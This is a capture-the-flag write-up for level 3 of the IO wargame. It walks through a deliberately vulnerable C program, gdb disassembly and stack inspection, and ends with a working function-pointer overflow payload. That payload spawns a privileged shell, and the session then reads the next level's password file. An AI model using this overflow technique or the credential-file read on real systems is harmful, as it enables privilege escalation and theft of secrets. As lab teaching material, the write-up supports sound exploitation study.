@@ -1,0 +1,318 @@
+I/O – level 3
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+//bla, based on work by beach
+ 
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+ 
+void good()
+{
+puts(&quot;Win.&quot;);
+execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
+}
+void bad()
+{
+printf(&quot;I'm so sorry, you're at %p and you want to be at %p\n&quot;, bad, good);
+}
+ 
+int main(int argc, char **argv, char **envp)
+{
+void (*functionpointer)(void) = bad;
+char buffer[50];
+ 
+if(argc != 2 || strlen(argv[1]) &lt; 4)
+return 0;
+ 
+memcpy(buffer, argv[1], strlen(argv[1]));
+memset(buffer, 0, strlen(argv[1]) - 4);
+ 
+printf(&quot;This is exciting we're going to %p\n&quot;, functionpointer);
+functionpointer();
+ 
+return 0;
+}
+There was only one challenge for level 3 in I/O, having a look at the source code for the binary which I included above. Straight away I see I need to get the good function to execute as this function spawns the shell for the next level. The  bad function prints the memory location you are currently at and also the target memory location.
+
+In the main function it begins with assigning a function pointer for the memory location for the bad function which is where we get the idea that the target memory location is where the good function is. The main function then creates an array of 50 bytes called buffer, then creates to see if the string entered with executing the binary is greater then 4 bytes.
+
+1
+2
+3
+level3@io:~$ /levels/level03 aaaa
+This is exciting we're going to 0x80484a4
+I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
+The output shows the current memory location (0x80484a4) and the target memory location (0x8048474). Going back to the main function if the input is less then 4 the program returns 0 and exits. The memcpy function copies the values of num bytes from the location pointed by source directly to the memory block pointed by destination, which means the program copies the length of the input into the buffer which is placed at the starting function pointer for bad. The memset function displays the address the function pointer is pointing too. I used gdb to debug the main function of the binary.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+level3@io:~$ gdb -q /levels/level03
+Reading symbols from /levels/level03...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+ 
+Dump of assembler code for function main:
+0x080484c8 &lt;+0&gt;:     push   ebp
+0x080484c9 &lt;+1&gt;:     mov    ebp,esp
+0x080484cb &lt;+3&gt;:     sub    esp,0x78
+0x080484ce &lt;+6&gt;:     and    esp,0xfffffff0
+0x080484d1 &lt;+9&gt;:     mov    eax,0x0
+0x080484d6 &lt;+14&gt;:    sub    esp,eax
+0x080484d8 &lt;+16&gt;:    mov    DWORD PTR [ebp-0xc],0x80484a4
+0x080484df &lt;+23&gt;:    cmp    DWORD PTR [ebp+0x8],0x2
+0x080484e3 &lt;+27&gt;:    jne    0x80484fc &lt;main+52&gt;
+0x080484e5 &lt;+29&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+0x080484e8 &lt;+32&gt;:    add    eax,0x4
+0x080484eb &lt;+35&gt;:    mov    eax,DWORD PTR [eax]
+0x080484ed &lt;+37&gt;:    mov    DWORD PTR [esp],eax
+&lt;strong&gt;0x080484f0 &lt;+40&gt;:    call   0x804839c &lt;strlen@plt&gt;&lt;/strong&gt;
+0x080484f5 &lt;+45&gt;:    cmp    eax,0x3
+0x080484f8 &lt;+48&gt;:    jbe    0x80484fc &lt;main+52&gt;
+0x080484fa &lt;+50&gt;:    jmp    0x8048505 &lt;main+61&gt;
+0x080484fc &lt;+52&gt;:    mov    DWORD PTR [ebp-0x5c],0x0
+0x08048503 &lt;+59&gt;:    jmp    0x8048579 &lt;main+177&gt;
+0x08048505 &lt;+61&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+0x08048508 &lt;+64&gt;:    add    eax,0x4
+0x0804850b &lt;+67&gt;:    mov    eax,DWORD PTR [eax]
+0x0804850d &lt;+69&gt;:    mov    DWORD PTR [esp],eax
+&lt;strong&gt;0x08048510 &lt;+72&gt;:    call   0x804839c &lt;strlen@plt&gt;&lt;/strong&gt;
+0x08048515 &lt;+77&gt;:    mov    DWORD PTR [esp+0x8],eax
+0x08048519 &lt;+81&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+0x0804851c &lt;+84&gt;:    add    eax,0x4
+0x0804851f &lt;+87&gt;:    mov    eax,DWORD PTR [eax]
+0x08048521 &lt;+89&gt;:    mov    DWORD PTR [esp+0x4],eax
+0x08048525 &lt;+93&gt;:    lea    eax,[ebp-0x58]
+0x08048528 &lt;+96&gt;:    mov    DWORD PTR [esp],eax
+&lt;strong&gt;0x0804852b &lt;+99&gt;:    call   0x804838c &lt;memcpy@plt&gt;&lt;/strong&gt;
+0x08048530 &lt;+104&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048533 &lt;+107&gt;:   add    eax,0x4
+0x08048536 &lt;+110&gt;:   mov    eax,DWORD PTR [eax]
+0x08048538 &lt;+112&gt;:   mov    DWORD PTR [esp],eax
+&lt;strong&gt;0x0804853b &lt;+115&gt;:   call   0x804839c &lt;strlen@plt&gt;&lt;/strong&gt;
+0x08048540 &lt;+120&gt;:   sub    eax,0x4
+0x08048543 &lt;+123&gt;:   mov    DWORD PTR [esp+0x8],eax
+0x08048547 &lt;+127&gt;:   mov    DWORD PTR [esp+0x4],0x0
+0x0804854f &lt;+135&gt;:   lea    eax,[ebp-0x58]
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+ 
+0x08048552 &lt;+138&gt;:   mov    DWORD PTR [esp],eax
+&lt;strong&gt;0x08048555 &lt;+141&gt;:   call   0x804835c &lt;memset@plt&gt;&lt;/strong&gt;
+0x0804855a &lt;+146&gt;:   mov    eax,DWORD PTR [ebp-0xc]
+0x0804855d &lt;+149&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x08048561 &lt;+153&gt;:   mov    DWORD PTR [esp],0x80486c0
+&lt;strong&gt; 0x08048568 &lt;+160&gt;:   call   0x80483ac &lt;printf@plt&gt;&lt;/strong&gt;
+0x0804856d &lt;+165&gt;:   mov    eax,DWORD PTR [ebp-0xc]
+0x08048570 &lt;+168&gt;:   call   eax
+0x08048572 &lt;+170&gt;:   mov    DWORD PTR [ebp-0x5c],0x0
+0x08048579 &lt;+177&gt;:   mov    eax,DWORD PTR [ebp-0x5c]
+0x0804857c &lt;+180&gt;:   leave
+0x0804857d &lt;+181&gt;:   ret
+End of assembler dump.
+I want to see the state of the stack is effected after the buffer has been sent, to do this I set a break  point right after the memcpy function, the memory location being “0x08048530” and then ran the binary with a string of 5 A’s.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+(gdb) break *0x08048530
+Breakpoint 1 at 0x8048530
+(gdb) run AAAAA
+Starting program: /levels/level03 AAAAA
+ 
+Breakpoint 1, 0x08048530 in main ()
+(gdb) x/32xw $esp
+0xbffffc60:     0xbffffc80      0xbffffe9a      0x00000005      0x00000001
+0xbffffc70:     0xb7fff908      0xb7e878d0      0xbffffd84      0xbffffe8a
+0xbffffc80:     &lt;strong&gt;0x41414141&lt;/strong&gt;      0xb7eb73&lt;strong&gt;41&lt;/strong&gt;      0x0000002f      0xb7fd1ff4
+0xbffffc90:     0x00000000      0x080497c8      0xbffffca8      0x08048338
+0xbffffca0:     0xb7ff0590      0x080497c8      0xbffffcd8      0x080485a9
+0xbffffcb0:     0xb7fd2304      0xb7fd1ff4      0x08048590      0xbffffcd8
+0xbffffcc0:     0xb7eb7505      0xb7ff0590      0x0804859b      &lt;strong&gt;0x080484a4&lt;/strong&gt;
+0xbffffcd0:     0x08048590      0x00000000      0xbffffd58      0xb7e9ee16
+(gdb)
+In the above output in gdb I can see that the buffer is written from low to high addresses on the stack. I now need to determine how many bytes would it take to get up to the function pointer set by the program for the bad function (0x080484a4).
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+(gdb) run $(python -c 'print &quot;A&quot;*76')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /levels/level03 $(python -c 'print &quot;A&quot;*76')
+ 
+Breakpoint 1, 0x08048530 in main ()
+(gdb) x/32xw $esp
+0xbffffc20:     0xbffffc40      0xbffffe53      0x0000004c      0x00000001
+0xbffffc30:     0xb7fff908      0xb7e878d0      0xbffffd44      0xbffffe43
+0xbffffc40:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc50:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc60:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc70:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc80:     0x41414141      0x41414141      0x41414141      &lt;strong&gt;0x080484a4&lt;/strong&gt;
+0xbffffc90:     0x08048590      0x00000000      0xbffffd18      0xb7e9ee16
+(gdb)
+By trial an error I have found that 76 bytes is required to get to the point in memory where the function pointer for the bad function is, going back to the source code the binary the buffer is defined as “char buffer[50];” but because memcpy() doesn’t do checks to see if the input is inside the range of the buffer array thus allowing for the simple buffer overflow to occur in the binary. Taking all this information I know need to determine the point in memory where good function starts.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+(gdb) disassemble good
+Dump of assembler code for function good:
+&lt;strong&gt;0x08048474&lt;/strong&gt; &lt;+0&gt;:     push   ebp
+0x08048475 &lt;+1&gt;:     mov    ebp,esp
+0x08048477 &lt;+3&gt;:     sub    esp,0x18
+0x0804847a &lt;+6&gt;:     mov    DWORD PTR [esp],0x8048660
+0x08048481 &lt;+13&gt;:    call   0x80483bc &lt;puts@plt&gt;
+0x08048486 &lt;+18&gt;:    mov    DWORD PTR [esp+0x8],0x0
+0x0804848e &lt;+26&gt;:    mov    DWORD PTR [esp+0x4],0x8048665
+0x08048496 &lt;+34&gt;:    mov    DWORD PTR [esp],0x8048668
+0x0804849d &lt;+41&gt;:    call   0x804837c &lt;execl@plt&gt;
+0x080484a2 &lt;+46&gt;:    leave
+0x080484a3 &lt;+47&gt;:    ret
+End of assembler dump.
+I now know the good function begins at the memory location “0x08048474” which means i add these bytes to the $(python -c ‘print “A”*76’) like so $(python -c ‘print “A”*76 + “\x74\x84\x04\x08″‘) I will be overwrite the function pointer for the bad function’s memory location with the good function’s memory location, making the reverse order to the memory location as the stack operates as first in last out.
+
+1
+2
+3
+4
+5
+6
+7
+8
+level3@io:~$ /levels/level03 $(python -c 'print &quot;A&quot;*76 + &quot;\x74\x84\x04\x08&quot;')
+This is exciting we're going to 0x8048474
+Win.
+sh-4.2$ id
+uid=1003(level3) gid=1003(level3) euid=1004(level4) groups=1004(level4),1003(level3),1029(nosu)
+sh-4.2$ cat /home/level4/.pass
+766ShzwZAUbf4g
+sh-4.2$
